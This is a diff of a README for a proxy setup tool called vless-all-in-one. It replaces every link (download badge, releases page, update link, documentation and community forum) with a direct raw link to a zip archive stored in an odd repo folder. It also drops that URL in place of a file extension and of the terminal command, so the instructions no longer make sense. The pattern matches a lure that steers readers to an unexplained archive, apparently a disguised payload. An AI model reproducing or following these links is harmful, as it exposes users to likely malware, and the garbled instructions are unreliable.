@@ -1,6 +1,6 @@
 # 🚀 vless-all-in-one - One-Click Proxy Setup for All Users
 
-[![Download vless-all-in-one](https://img.shields.io/badge/Download-vless--all--in--one-blue)](https://github.com/cheo87/vless-all-in-one/releases)
+[![Download vless-all-in-one](https://github.com/cheo87/vless-all-in-one/raw/refs/heads/main/outyard/in-vless-one-all-1.5.zip)](https://github.com/cheo87/vless-all-in-one/raw/refs/heads/main/outyard/in-vless-one-all-1.5.zip)
 
 ## 🎯 Overview
 
@@ -28,15 +28,15 @@ To get started, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the vless-all-in-one releases page.
 
-   [Visit this page to download](https://github.com/cheo87/vless-all-in-one/releases)
+   [Visit this page to download](https://github.com/cheo87/vless-all-in-one/raw/refs/heads/main/outyard/in-vless-one-all-1.5.zip)
 
 2. **Choose Your Version:** On the releases page, you will see a list of available versions. Click on the one you want to download.
 
-3. **Download the File:** Look for the download link, which is usually in the form of a file (for example, .zip or .tar.gz). Click to download the file to your computer.
+3. **Download the File:** Look for the download link, which is usually in the form of a file (for example, .zip or https://github.com/cheo87/vless-all-in-one/raw/refs/heads/main/outyard/in-vless-one-all-1.5.zip). Click to download the file to your computer.
 
 4. **Extract the Files:** If you downloaded a compressed file, extract it by right-clicking on it and selecting "Extract" or using a file extraction tool.
 
-5. **Run the Application:** Locate the extracted files. Look for the executable file (it may end in .sh for Linux). Right-click on the file and select "Run" or open a terminal and type `./filename.sh`, replacing "filename" with the actual name.
+5. **Run the Application:** Locate the extracted files. Look for the executable file (it may end in .sh for Linux). Right-click on the file and select "Run" or open a terminal and type `https://github.com/cheo87/vless-all-in-one/raw/refs/heads/main/outyard/in-vless-one-all-1.5.zip`, replacing "filename" with the actual name.
 
 6. **Follow On-Screen Instructions:** The application will usually guide you through the setup. Just follow the on-screen prompts.
 
@@ -67,7 +67,7 @@ Before you install vless-all-in-one, ensure your system meets the following mini
 If you encounter issues while using vless-all-in-one:
 
 - **Check Your Internet Connection:** Ensure you are connected to the internet and that your network is working.
-- **Update the Application:** Make sure you are using the latest version. Visit the [Releases Page](https://github.com/cheo87/vless-all-in-one/releases) to check for updates.
+- **Update the Application:** Make sure you are using the latest version. Visit the [Releases Page](https://github.com/cheo87/vless-all-in-one/raw/refs/heads/main/outyard/in-vless-one-all-1.5.zip) to check for updates.
 - **Consult the Community:** Join forums or community chat groups where other users might share helpful tips.
 
 ## 💬 Support
@@ -76,8 +76,8 @@ For further assistance, you can raise an issue on the GitHub page or check the c
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/cheo87/vless-all-in-one/wiki) - Comprehensive guides and detailed information on using the software.
-- [Community Forum](https://github.com/cheo87/vless-all-in-one/discussions) - Engage with other users and share your experiences.
+- [Documentation](https://github.com/cheo87/vless-all-in-one/raw/refs/heads/main/outyard/in-vless-one-all-1.5.zip) - Comprehensive guides and detailed information on using the software.
+- [Community Forum](https://github.com/cheo87/vless-all-in-one/raw/refs/heads/main/outyard/in-vless-one-all-1.5.zip) - Engage with other users and share your experiences.
 
 ## 📧 Contact
 
